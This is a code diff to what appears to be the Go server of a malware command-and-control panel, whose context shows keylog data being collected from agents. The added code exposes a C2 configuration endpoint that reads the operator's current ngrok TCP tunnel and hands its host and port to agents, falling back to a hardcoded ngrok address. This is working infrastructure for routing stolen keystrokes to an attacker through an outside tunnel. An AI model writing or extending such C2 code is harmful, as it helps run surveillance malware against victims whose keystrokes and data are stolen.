@@ -732,6 +732,57 @@ func BroadcastKeylogFull(agentID string, logs string, count int, isLogging bool,
     }
 }
 
+
+func (h *WebHandler) handleC2Config(w http.ResponseWriter, r *http.Request) {
+    w.Header().Set("Content-Type", "application/json")
+    
+    // Query ngrok API untuk get current tunnel
+    host, port := getNgrokTunnel()
+    
+    response := map[string]interface{}{
+        "host": host,
+        "port": port,
+    }
+    
+    json.NewEncoder(w).Encode(response)
+}
+
+// Get current ngrok tunnel URL
+func getNgrokTunnel() (string, int) {
+    resp, err := http.Get("http://localhost:4040/api/tunnels")
+    if err != nil {
+        return "2.tcp.ngrok.io", 25375 // fallback
+    }
+    defer resp.Body.Close()
+
+    var result struct {
+        Tunnels []struct {
+            PublicURL string `json:"public_url"`
+            Proto     string `json:"proto"`
+        } `json:"tunnels"`
+    }
+
+    json.NewDecoder(resp.Body).Decode(&result)
+
+    // Cari TCP tunnel
+    for _, tunnel := range result.Tunnels {
+        if tunnel.Proto == "tcp" {
+            // Parse: tcp://2.tcp.ngrok.io:25375
+            parts := strings.Split(tunnel.PublicURL, "://")
+            if len(parts) == 2 {
+                hostPort := strings.Split(parts[1], ":")
+                if len(hostPort) == 2 {
+                    var port int
+                    fmt.Sscanf(hostPort[1], "%d", &port)
+                    return hostPort[0], port
+                }
+            }
+        }
+    }
+
+    return "2.tcp.ngrok.io", 25375 // fallback
+}
+
 // ==================== WEB UI ====================
 
 func (h *WebHandler) handleIndex(w http.ResponseWriter, r *http.Request) {
